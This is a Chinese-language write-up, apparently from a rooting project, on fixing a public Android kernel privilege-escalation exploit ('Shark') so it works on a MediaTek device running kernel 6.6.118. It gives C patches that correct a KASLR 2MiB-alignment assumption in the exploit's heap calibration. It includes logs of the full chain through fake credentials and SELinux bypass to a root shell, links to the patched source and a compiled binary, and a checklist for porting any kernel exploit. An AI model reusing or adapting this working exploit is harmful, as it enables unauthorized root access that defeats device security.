# 09 · ★★ 根因：一个「KASLR 必须 2MiB 对齐」的假设

> **这是整个项目最有价值的一章。**
> 一个隐式假设让公开源码在特定设备上 100% 失败，而上游二进制却能成功。
> 如果你在移植别人的内核 exploit，这一章大概率能帮你定位问题。

---

## 一、现象

### 1.1 上游二进制能跑，源码编译的不能

我们从 [kpgc10kai/Shark](https://github.com/kpgc10kai/Shark)（上游 v2.3.2 的 fork）
编译出 exploit，在同一台设备上跑：

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
[+] pid=17543 cpu=2
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
[calib] timers=0                                     ← ★ 零
[base] made=512 timers=0 pages=15 best=0 count=0
[-] base calibration failed
```

**但从上游 APK 里提取的二进制（v2.5.1）能拿到 `timers=512`：**

```
[calib] timers=512
[base] made=512 timers=512 pages=15 best=0xffffff7fc0000000 count=202
```

**⇒ 源码和二进制行为不一致 ⇒ 上游改了代码但没回流到公开源码。**

### 1.2 更奇怪的是 cred 能拿到，task 拿不到

后来用 `--auto` 模式跑，看到：

```
[cred] attempt=0 child=15733 R=0xffffff810c664e40 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[cred] attempt=1 child=15734 R=0xffffff810c664900 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[cred] attempt=2 child=15735 R=0xffffff810c664c00 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[cred] attempt=3 child=15736 R=0xffffff810c664840 hello=0x52445931 recs=1 task=0 task_recs=0 failed
[-] cred leak failed
```

**`recs=1`（cred 找到了）但 `task_recs=0`（task 找不到）。**

同一个 trace buffer、同一个扫描循环、同样的过滤思路 —— **一个行一个不行。差别在哪？**

---

## 二、定位过程

### 2.1 先验证「常量对不对」

`scan_task_allocs` 的过滤条件：

```c
if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
    continue;
```

`COPY_PROCESS_LOW21 = 0xab93c`，来自 profile。

**这在 vmlinux 里对不对？**

```console
$ python tools/kcalls.py copy_process | grep kmem_cache_alloc
  0xffffffc0800ab938  bl -> kmem_cache_alloc_node+0x0
```

**`bl` 在 `0xab938`，返回地址（`_RET_IP_`）= `0xab93c`。** ✅ **常量对。**

### 2.2 再确认 trace 里真的有这个事件

直接用 shell 开 tracepoint 看文本输出：

```console
$ adb shell "echo 1 > /sys/kernel/tracing/events/kmem/kmem_cache_alloc/enable"
$ adb shell "cat /sys/kernel/tracing/trace | grep copy_process"
```

```
sh-17367 [007] .... 3451.640059: kmem_cache_alloc:
    call_site=copy_process+0x140/0x1030
    ptr=00000000f13ff2d1
    bytes_req=4800 bytes_alloc=4800 gfp_flags=GFP_KERNEL
```

**事件确实有，`bytes_alloc=4800` 也在 `[0x1000, 0x1a00]` 范围内。**

（`ptr` 是 hash 过的 —— 那是 `%pK` 的效果，raw 记录里是真指针。）

### 2.3 那问题只能出在「低 21 位比较」上

既然事件在、常量对、范围对 —— **只剩下 `(site & 0x1fffff)` 这一句能出问题。**

**假设：低 21 位在运行时会变。**

### 2.4 用 cred 的日志反推验证

`scan_cred_allocs` 里 `CRED_SITE_LOW21 = 0`，也就是**跳过检查**，
但它会把实测到的 `site & 0x1fffff` 打印出来：

```
[cred] ... site_low=0x164064 ...
```

而 `prepare_creds+0x24` 的**链接地址**是 `0xffffffc0800e4064`。

计算：

```python
site_low        = 0x164064
link_low21      = 0xe4064
difference      = (0x164064 - 0xe4064) & 0x1fffff
                = 0x80000
```

**差值 `0x80000` —— 正好是 slide 的 mod-2MiB 分量！**

而我们从日志里知道 slide：

```
slide=0x2b45280000
slide & 0x1fffff = 0x80000     ✅ 完全吻合
```

**⇒ 假设成立：低 21 位会随 slide 的 mod-2MiB 分量平移。**

### 2.5 计算受影响的符号

| 符号 | 链接地址低21位 | + slide 偏移 | **运行时低21位** | 源码比较的 | 结果 |
|---|---|---|---|---|---|
| `do_timer_create+0xa8` | `0x195d48` | +`0x80000` | **`0x15d48`** | `0x195d48` | ✗ |
| `copy_process+0x140` | `0x0ab93c` | +`0x80000` | **`0x12b93c`** | `0xab93c` | ✗ |
| `prepare_creds+0x24` | `0xe4064` | +`0x80000` | **`0x164064`** | （0 = 不检查）| ✅ |

**⇒ timer 和 task 都因为平移而永远匹配不上；cred 因为不检查所以能拿到。**

**这就是「为什么 cred 行、task 不行」的完整解释。**

---

## 三、为什么上游作者没发现

因为他在 probe 里写了硬性前提：

```c
nrec = scan_timer_allocs(raw, (size_t)n, getpid(), ptrs, 128, &site0);
...
if (!nrec || !site0 ||
    (site0 & 0x1fffffULL) != (unsigned long long)TIMER_SITE_LOW21) {
    printf("PROBE_TIMER_FAIL\n");
    return 1;
}
g_slide = site0 - STATIC_TIMER_SITE;
printf("PROBE_SLIDE=%#llx aligned=%d\n", g_slide, (g_slide & 0x1fffffULL) == 0);
if (g_slide & 0x1fffffULL)
    return 1;              // ★★ 非 2MiB 对齐直接放弃
```

**他验证过的那台机器 KASLR 是 2MiB 对齐的（`aligned=1`），
所以低 21 位不变、比较成立。**

**我们这台是 512KB 对齐（`aligned=0`），所以整个比较链全废。**

---

## 四、修复

### 4.1 关键观察：只有 4 种可能

ARM64 的 KASLR 偏移是 `0x80000`（512KB）的倍数，所以
`slide mod 2MiB` 只可能是：

```
0x000000 / 0x080000 / 0x100000 / 0x180000
```

**只有 4 个候选。让程序自己试。**

### 4.2 补丁一：加全局补偿量

```c
/* KASLR slide 的 mod-2MiB 分量 */
static unsigned long long g_low_adj = 0ULL;
```

### 4.3 补丁二：所有低21位比较都加上它

```c
/* 改前 */
if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
    continue;

/* 改后 */
if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
    continue;
```

（总共改 3 处：timer ×2、task ×1）

### 4.4 补丁三：校准阶段扫 4 个候选

```c
{
    int c = 0;
    static const unsigned long long cands[4] = {
        0ULL, 0x80000ULL, 0x100000ULL, 0x180000ULL};
    int best_ci = 0;

    for (int ci = 0; ci < 4; ci++) {
        int cc;

        g_low_adj = cands[ci];
        cc = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
        if (cc > c) { c = cc; best_ci = ci; }
    }
    g_low_adj = cands[best_ci];
    /* 用最终值重新收集，填满 ptrs[] */
    c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
}
```

probe 路径同样处理。

### 4.5 补丁四：放宽 2MiB 对齐硬检查

```c
/* 改前 */
if (g_slide & 0x1fffffULL)
    return 1;

/* 改后：非 2MiB 对齐不再致命 */
if ((g_slide & 0x1fffffULL) && (g_slide & 0x7ffffULL))
    return 1;
```

---

## 五、修复效果

### 5.1 probe 立刻通过

```
PROBE_TIMER made=128 recs=128 site=0xffffffebc5415d48 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=21 best=0xffffff7fc0000000 count=330
[cred] attempt=0 child=18236 R=0xffffff80c117a180 site_low=0x164064 recs=1
       task=0xffffff807a40cb00 task_recs=1            ← ★ 从 0 变成 1
PROBE_TASK=0xffffff807a40cb00 expected_low21=0xab93c
PROBE_CRED=0xffffff80c117a180 req=0xb8 alloc=0xc0 uid_off=0x8
PROBE_OK
```

**`low_adj=0x80000` 被正确识别，`task_recs` 从 0 变成 1。**

### 5.2 完整链路跑通

```
[+] stage fake_cred  ... burst hit=1 after 48ms
[+] stage selinux    ... burst hit=1 after 132ms
[+] stage fake_uid   ... burst hit=1 after 103ms
[+] child report stage=2 uid=0 euid=0 resuid=0/0/0
LATE_LOAD_RC=0
```

### 5.3 最终结果

```console
$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

---

## 六、补丁文件

- [`artifacts/plant_core.patched.inc`](../artifacts/plant_core.patched.inc) —— 打过补丁的完整源码
- [`artifacts/patch_shark_low21.py`](../artifacts/patch_shark_low21.py) —— 可重放的补丁脚本
- [`artifacts/shark-k66118-fixed`](../artifacts/shark-k66118-fixed) —— 编译好的 aarch64 二进制

**补丁脚本用法：**

```bash
cp plant_core.inc plant_core.orig.inc
python patch_shark_low21.py
# 然后手动添加全局变量和 probe 路径的两处改动（见 4.2 / 4.4 / 4.5）
```

---

## 七、这条经验的普适性

### 7.1 「低 21 位」这个数是怎么来的

`0x1fffff` = 2MiB - 1。

内核 exploit 里之所以用它，是因为**假设 KASLR 是 2MiB 对齐**，
这样「链接地址的低 21 位」就等于「运行时地址的低 21 位」，
于是可以不用先知道 slide 就能匹配符号。

**这个假设在很多 ARM64 设备上成立，但不是全部。**

### 7.2 什么情况下不成立

| 条件 | slide 对齐 |
|---|---|
| `CONFIG_RANDOMIZE_BASE` + 特定 `VA_BITS` / 页大小组合 | 可能 512KB |
| 我们的设备（MT8786 + 6.6.118 android15-8 + 4K 页） | **512KB** |
| popsicle（小米 17 Pro Max + 6.12.69） | 2MiB |

### 7.3 移植任何内核 exploit 时的检查清单

```
① 不要假设低 21 位在运行时等于链接地址低 21 位
   → 先算出 slide & 0x1fffff，看看是不是 0

② 如果源码有 `xxx_LOW21` 这类常量，
   全部改成 `(LOW21 + (slide & 0x1fffff)) & 0x1fffff`

③ 如果源码有 `if (slide & 0x1fffff) return fail;` 之类的检查，
   那是作者在自己机器上验证的假设，需要放宽

④ 用「不检查」的那条路径（比如 cred）反推 slide 偏移
   —— 这是一个绝好的自校准锚点
```

### 7.4 我们是怎么发现的（可复用的思路）

```
现象：A 能拿到，B 拿不到，两者用同一套逻辑
 ↓
排除：常量对不对？（反汇编查 → 对）
排除：事件在不在？（开 tracepoint 看文本 → 在）
 ↓
剩下的唯一变量：低 21 位比较
 ↓
验证：找一个「不检查低21位」的路径（cred），
      看它报出来的实测值和链接地址差多少
 ↓
差值 = 0x80000 = slide mod 2MiB  ✅ 确认
```

**「找一个不做过滤的旁路来反推偏差」这个技巧非常有用。**

---

## 八、一句话总结

> **KASLR 的对齐粒度是设备属性，不是常量。**
> **任何把「链接地址的位片段」和「运行时地址的位片段」直接比较的代码，
> 都必须先补偿 slide 的对应分量。**
